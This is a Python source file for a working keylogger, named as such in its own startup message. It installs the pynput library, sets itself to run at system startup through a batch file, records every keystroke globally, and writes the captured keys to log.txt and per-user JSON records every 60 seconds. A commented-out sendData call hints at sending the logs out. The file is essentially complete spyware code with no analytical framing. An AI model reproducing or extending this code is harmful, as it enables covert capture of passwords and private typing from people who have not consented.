import subprocess

# check_requests = subprocess.run(
#     ["pip", "show", "requests"], shell=True, capture_output=True
# ).returncode
# if check_requests == 1:
#     print("INSTALLING REQUESTS...")
#     subprocess.run(["pip", "install", "requests"], shell=True)
check_pynput = subprocess.run(
    ["pip", "show", "pynput"], shell=True, capture_output=True
).returncode
if check_pynput == 1:
    print("INSTALLING PYNPUT...")
    subprocess.run(["pip", "install", "pynput"], shell=True)
from pynput.keyboard import Key, Listener
import threading
from time import sleep
from datetime import datetime
import recordJSONManager as rjM
import settingsManager as sM

# import sendData as sD
from enableRunAtStartUp import createBat

version = "v4"
# Start screen
print("Starting Key logger ...")
createBat()
# Setting up username
setting_values = sM.readSetting()
if setting_values["username"] == "USERNAME":
    returnCode = subprocess.call("start getusername.py", shell=True)
if setting_values["version"] != version:
    # recordsJson = rjM.readRecordLog()
    # for key in recordsJson:
    #     if recordsJson[key]:
    #         recordsJson[key] = False
    # rjM.updateRecordLog(recordsJson)
    sM.setVersion(version)
    print("Version updated")
# Global variables
username = str()
latest_date = str()
keys = []
in_keys = []
caps = False
state = True
sleepTime = 60

# Function to extract setting data
def getSettingValue():
    global username, latest_date
    setting_values = sM.readSetting()
    username = setting_values["username"]
    latest_date = setting_values["Latest_record_date"]


# Function on key press event
def key_press(key):
    global keys, caps, in_keys
    in_key = key = str(key)
    if key == "Key.caps_lock":
        caps = not caps
    if not key.startswith("Key"):
        if key.startswith("<"):  # For numpad keys
            key = key.replace("<", "")
            key = key.replace(">", "")
            if key == "110":
                key = "."
            elif int(key) >= 96 and int(key) <= 105:
                key = int(key) - 96
            else:
                return False
        elif not key.startswith(
            "'\\x"
        ):  # For other keys (alphabet, numeric, special characters)
            key = key.replace("'", "")
            if caps:
                key = key.upper()
            if key.startswith("\\"):
                return True
        else:
            return True
        keys.append(str(key))
    elif key == "Key.enter" or key == "Key.esc":  # For Enter key
        try:
            if keys[len(keys) - 1] != "\n":
                keys.append(str("\n"))
        except:
            keys.append(str("\n"))
    elif key == "Key.space":  # For space key
        keys.append(" ")
    elif key == "Key.backspace":  # For backspace key (<-)
        keys.append("<-")
    if in_key.startswith("Key"):
        in_key = key.split(".")[1].upper()
    else:
        in_key = str(key).upper()
    in_keys.append(in_key)
    # print("{0} pressed".format(in_key))


# Function to terminate
# def key_release(key):
#     global state
#     if key == Key.end:
#         print(in_keys)
#         print(keys)
#         state = False
#         return False

# Function to manage Latest record file
def fileManager():
    global latest_date, username
    current_date = str(datetime.now().date())
    getSettingValue()
    if current_date != latest_date and username != "USERNAME":
        print("Creating new records file for {0} ...".format(current_date))
        rjM.createFile(username, current_date, latest_date)
        sM.setLatestDate(current_date)
        getSettingValue()


# Funtion to write in file
def writeToFile():
    global keys, state, sleepTime, in_keys, username
    while state:
        print("Sleeping...")
        sleep(sleepTime)
        fileManager()
        if username != "USERNAME":
            rjM.updateFile(username, latest_date, in_keys)
            with open("log.txt", "a") as lg:
                for key in keys:
                    lg.write(key)
            keys = []
            in_keys = []
            # sD.sendData()
        else:
            print("USERNAME NOT SET")


# Create a thread to handle writing log file every defined time
th = threading.Thread(target=writeToFile)
th.daemon = True
th.start()

# Listening to key pressed event
# with Listener(on_press=key_press,on_release=key_release) as listen:
#     listen.join()
with Listener(on_press=key_press) as listen:
    listen.join()

th.join()